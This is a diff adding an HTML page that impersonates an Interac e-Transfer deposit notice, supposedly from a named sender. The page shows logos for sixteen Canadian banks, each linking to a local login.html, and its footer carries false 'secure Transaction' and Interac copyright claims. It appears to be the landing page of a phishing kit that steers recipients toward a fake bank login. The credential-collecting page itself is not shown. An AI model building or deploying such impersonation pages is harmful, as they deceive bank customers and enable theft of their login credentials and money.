@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Bank Selection</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            padding: 20px;
+            margin: 0;
+        }
+
+        .container {
+            background-color: #d3d3d3;
+            padding: 20px;
+            border-radius: 10px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .info-text {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .bank-container {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            /* Два банка в ряд */
+            gap: 10px;
+            /* Уменьшенный промежуток между изображениями */
+            justify-items: center;
+        }
+
+        .bank-img {
+            width: 170px;
+            /* Увеличенные размеры изображений */
+            height: 85px;
+            object-fit: contain;
+            background-color: #fff;
+            padding: 10px;
+            border-radius: 10px;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .bank-img:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 14px;
+            margin-top: 30px;
+        }
+
+        .footer a {
+            text-decoration: none;
+            color: #007bff;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Мобильная адаптивность */
+        @media (max-width: 768px) {
+            .bank-container {
+                grid-template-columns: repeat(2, 1fr);
+                /* Два банка в ряд на экранах меньше 768px */
+                gap: 10px;
+                /* Уменьшенный промежуток между изображениями */
+            }
+        }
+
+        @media (max-width: 480px) {
+            .bank-container {
+                grid-template-columns: repeat(2, 1fr);
+                /* Два банка в ряд на экранах меньше 480px */
+                gap: 10px;
+                /* Уменьшенный промежуток между изображениями */
+            }
+
+            .bank-img {
+                width: 130px;
+                /* Увеличение ширины изображений для мобильных устройств */
+                height: 65px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>Select Your Bank</h1>
+
+        <div class="info-text">
+            <p><strong>Deposit your money</strong></p>
+            <p>From: Artemii Motoroshni</p>
+        </div>
+
+        <div class="bank-container">
+            <a href="login.html?bank=td-canada"><img class="bank-img" src="images/Tdbank.png" alt="TD" /></a>
+            <a href="login.html?bank=rbc"><img class="bank-img" src="images/RBCbank.png" alt="RBC" /></a>
+            <a href="login.html?bank=atb-financial"><img class="bank-img" src="images/AtbFinancial.png" alt="ATB" /></a>
+            <a href="login.html?bank=bmo"><img class="bank-img" src="images/Bmobank.png" alt="BMO" /></a>
+            <a href="login.html?bank=cibc"><img class="bank-img" src="images/Cibcbank.png" alt="CIBC" /></a>
+            <a href="login.html?bank=coast-capital"><img class="bank-img" src="images/Coastbank.png" alt="Coast" /></a>
+            <a href="login.html?bank=laurentian-bank"><img class="bank-img" src="images/Laurentianbank.png"
+                    alt="Laurentian" /></a>
+            <a href="login.html?bank=manulife"><img class="bank-img" src="images/Manulifebank.png" alt="Manulife" /></a>
+            <a href="login.html?bank=meridian"><img class="bank-img" src="images/Meridianbank.png" alt="Meridian" /></a>
+            <a href="login.html?bank=motusbank"><img class="bank-img" src="images/MOTUsbank.png" alt="Motusbank" /></a>
+            <a href="login.html?bank=national-bank"><img class="bank-img" src="images/Nationalbank.png"
+                    alt="National Bank" /></a>
+            <a href="login.html?bank=peoples-trust"><img class="bank-img" src="images/Peoplestrustbank.png"
+                    alt="Peoples Trust" /></a>
+            <a href="login.html?bank=scotiabank"><img class="bank-img" src="images/Scotiabank.png"
+                    alt="Scotiabank" /></a>
+            <a href="login.html?bank=simplii"><img class="bank-img" src="images/Simplyfinbank.png" alt="Simplii" /></a>
+            <a href="login.html?bank=tangerine"><img class="bank-img" src="images/Tangerinebank.png"
+                    alt="Tangerine" /></a>
+            <a href="login.html?bank=wealthsimple"><img class="bank-img" src="images/Wealthsimplebank.png"
+                    alt="Wealthsimple" /></a>
+        </div>
+
+        <div class="footer">
+            <p>Interac e-Transfer Privacy Policy | Security</p>
+            <p>This is a secure Transaction</p>
+            <p>© 2000 — 2025 Interac Corp. All rights reserved. <a href="#">Terms of Use</a></p>
+            <p>® Trade-marks of Interac Corp.</p>
+        </div>
+    </div>
+</body>
+
+</html>
